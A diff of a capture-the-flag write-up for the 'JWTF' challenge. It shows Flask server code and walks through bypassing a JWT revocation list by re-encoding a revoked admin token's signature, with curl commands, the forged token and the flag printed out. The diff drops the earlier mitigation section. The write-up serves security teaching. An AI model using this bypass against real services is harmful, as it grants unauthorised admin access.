@@ -1,43 +1,69 @@
-## Overview
+**Challenge Title:** JWTF
 
-In this challenge, we bypass a Flask-based JWT Revocation List (JRL) by altering the token’s signature encoding. The server maintains a **denylist** of revoked admin tokens (the JRL) and performs a raw string comparison on the cookie value before verifying it. By fetching the revoked admin token from `/jrl`, converting its Base64URL‐encoded signature into standard Base64 (adding padding), and resubmitting it, we slip past the string‐match check—even though PyJWT happily accepts both encodings for verification—granting us an “admin: true” session and the flag. ([SuperTokens][1], [DEV Community][2])
-
----
-
-## Background
-
-### JWT & JRL
-
-* A **JSON Web Token (JWT)** is a compact, URL-safe means of transmitting claims between parties, signed per \[RFC 7519] and secured via JSON Web Signature (\[RFC 7515]) ([IETF Datatracker][3]).
-* To revoke issued tokens, many systems use a **denylist** (or blacklist) that stores raw token strings; any token in this list is refused, regardless of validity ([DEV Community][2]).
-
-### Base64URL vs. Base64
-
-* **Base64URL** (used by JWT) replaces `+`→`-` and `/`→`_` and omits `=` padding for URL safety.
-* **Standard Base64** uses `+` and `/` and includes `=` padding so the output length is a multiple of 4 ([Medium][4]).
-* Many libraries (including PyJWT) accept both formats when decoding, ignoring or auto‐adding padding as needed ([GitHub][5], [Stack Overflow][6]).
+**Vulnerability:** JWT Revocation List (JRL) Bypass via Signature Encoding Mismatch
 
 ---
 
-## Challenge Setup
+## Source Code & Key Endpoints
 
-1. **Secrets**
+```python
+# server.py (excerpt)
 
-   * `APP_SECRET` (HMAC‐SHA256 key for all tokens)
-   * `ADMIN_SECRET` (used only by `/get_admin_cookie`)
+FLAG = open('flag.txt','r').read()
+APP_SECRET = os.urandom(32).hex()
+ADMIN_SECRET = os.urandom(32).hex()
 
-2. **Endpoints**
+# JRL holds revoked tokens
+jrl = [
+    jwt.encode({"admin": True, "uid": '1337'}, APP_SECRET, algorithm="HS256")
+]
 
-   * `/` issues a **non-admin** JWT (`{"admin": false}`).
-   * `/get_admin_cookie?adminsecret=…&uid=…` issues an **admin** JWT if you know `ADMIN_SECRET` and use `uid ≠ '1337'`.
-   * `/jrl` returns a JSON array of revoked token strings (initially contains the original admin JWT with `uid='1337'`).
-   * `/flag` reads your `session` cookie, strips `=`, checks it **not** in JRL, then decodes it—returning the flag if `admin=true`.
+@app.route('/get_admin_cookie')
+def get_admin_cookie():
+    secret = request.args.get('adminsecret')
+    uid    = request.args.get('uid')
+    if secret == ADMIN_SECRET and uid != '1337':
+        resp = make_response('Cookie set')
+        resp.set_cookie('session',
+            jwt.encode({"admin": True, "uid": uid}, APP_SECRET, algorithm="HS256"))
+        return resp
+    return redirect('/')
+
+@app.route('/flag')
+def flag():
+    session = request.cookies.get('session','').strip().replace('=','')
+    if session in jrl:                    # ← JRL string‐compare check
+        return redirect('/')
+    payload = jwt.decode(session, APP_SECRET, algorithms=["HS256"])
+    if payload.get('admin'):
+        return FLAG
+    return redirect('/')
+```
 
 ---
 
-## Exploit
+## Why `/get_admin_cookie` Fails
 
-### 1. Retrieve the Revoked Token
+We cannot forge an admin token at `/get_admin_cookie` because we don’t know **ADMIN\_SECRET**, which is a random 32-byte hex string generated at startup and never revealed.
+
+---
+
+## What We Need for the Flag
+
+1. A valid JWT with `"admin": true`.
+2. That token **must not** match any entry in **jrl** (the revocation list).
+
+---
+
+## What to Bypass
+
+The server’s `/flag` endpoint performs a **raw string comparison** against `jrl` **before** decoding the token (line marked above). If our token string ≠ any in `jrl`, it proceeds to verify and decode.
+
+---
+
+## Exploit Steps
+
+### 1. Retrieve the Revoked Admin Token
 
 ```bash
 curl http://HOST:1337/jrl
@@ -53,51 +79,50 @@ curl http://HOST:1337/jrl
 
 ### 2. Convert Signature Encoding
 
-* **Original signature** (Base64URL):
+* **JWT format**: `<header>.<payload>.<signature>` where header/payload/signature are **Base64URL**-encoded ([JSON Web Tokens - jwt.io][1]).
+* **Base64URL** replaces `+`→`-`, `/`→`_` and omits `=` padding ([Medium][2]).
+* We change only the signature segment:
 
+  ```diff
+  - BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew
+  + BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew==
   ```
-  BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew
-  ```
-* **Convert** `-`→`+`, `_`→`/`, then **add** `=` padding until length % 4 = 0:
 
-  ````
-  BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew==
-  ``` :contentReference[oaicite:5]{index=5}
-  ````
+  (replace `-`→`+`, `_`→`/`, then add `=` until length mod 4 = 0) ([Base64 Guru][3]).
 
-### 3. Bypass JRL String Check
+### 3. Why This Bypasses JRL
 
-* The server’s JRL lookup is a **raw string** comparison of your cookie against its list. Our **re‐encoded** token no longer matches the stored entry, so it passes the JRL check ([DEV Community][2]).
-* PyJWT then decodes and verifies the token using `APP_SECRET`. Because it auto‐handles both Base64URL and padded Base64 signatures, it accepts our modified token as valid ([GitHub][5], [Stack Overflow][6]).
+* The server checks `if session in jrl:` using a **byte‐for‐byte** comparison of the cookie string.
+* Our re-encoded JWT string no longer matches the stored JRL entry, so it skips the revoke check ([GitHub][4]).
+* PyJWT’s decoder happily accepts the padded Base64 signature even though RFC 7515 mandates unpadded Base64URL for JWTs ([IETF][5]).
 
-### 4. Fetch the Flag
-
-```bash
-curl -b "session=<header>.<payload>.BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew==" http://HOST:1337/flag
+```diff
+@app.route('/flag')
+def flag():
+    session = request.cookies.get('session','').strip().replace('=','')
+-   if session in jrl:
++   if session in jrl:   # our modified string ≠ original
+        return redirect('/')
+    payload = jwt.decode(session, APP_SECRET, algorithms=["HS256"])
 ```
 
-**Result:**
+### 4. Fetching the Flag
+
+Set your `session` cookie to the modified token and request `/flag`:
+
+```bash
+curl -b "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew==" \
+     http://HOST:1337/flag
+```
+
+**Flag:**
 
 ```
 byuctf{idk_if_this_means_anything_but_maybe_its_useful_somewhere_97ba5a70d94d}
 ```
 
----
-
-## Mitigations & Takeaways
-
-* **Canonicalize** token strings (e.g., normalize Base64URL) before blacklist checks to prevent representation‐based bypasses ([Medium][7]).
-* Better: store unique token identifiers (the `jti` claim) in the revocation list rather than raw string values ([curity.io][8]).
-
----
-
-*Happy hacking!*
-
-[1]: https://supertokens.com/blog/revoking-access-with-a-jwt-blacklist?utm_source=chatgpt.com "Revoke Access Using a JWT Blacklist | SuperTokens"
-[2]: https://dev.to/supertokens/revoking-access-with-a-jwt-blacklistdeny-list-3e4p?utm_source=chatgpt.com "Revoking Access with a JWT Blacklist/Deny List - DEV Community"
-[3]: https://datatracker.ietf.org/doc/html/rfc7515?utm_source=chatgpt.com "RFC 7515 - JSON Web Signature (JWS) - Datatracker - IETF"
-[4]: https://medium.com/%40bagdasaryanaleksandr97/understanding-base64-vs-base64-url-encoding-whats-the-difference-31166755bc26?utm_source=chatgpt.com "Understanding Base64 vs Base64 URL Encoding - Medium"
-[5]: https://github.com/jpadilla/pyjwt/issues/676?utm_source=chatgpt.com "JWTs containing base64 padding are erroneously accepted #676"
-[6]: https://stackoverflow.com/questions/77854959/is-signature-in-jwt-base64-encoded?utm_source=chatgpt.com "Is signature in JWT base64 encoded? - Stack Overflow"
-[7]: https://medium.com/%40ahmedosamaft/understanding-jwt-revocation-strategies-allowlist-denylist-and-jti-matcher-9d298893f8a1?utm_source=chatgpt.com "Understanding JWT Revocation Strategies: Allowlist, Denylist, and ..."
-[8]: https://curity.io/resources/learn/jwt-best-practices/?utm_source=chatgpt.com "JWT Security Best Practices | Curity"
+[1]: https://jwt.io/introduction?utm_source=chatgpt.com "JSON Web Token Introduction - jwt.io"
+[2]: https://medium.com/%40bagdasaryanaleksandr97/understanding-base64-vs-base64-url-encoding-whats-the-difference-31166755bc26?utm_source=chatgpt.com "Understanding Base64 vs Base64 URL Encoding - Medium"
+[3]: https://base64.guru/standards/base64url?utm_source=chatgpt.com "Base64URL | Base64 Standards"
+[4]: https://github.com/jpadilla/pyjwt/issues/676?utm_source=chatgpt.com "JWTs containing base64 padding are erroneously accepted #676"
+[5]: https://www.ietf.org/archive/id/draft-jones-json-web-token-02.html?utm_source=chatgpt.com "JSON Web Token (JWT) - IETF"
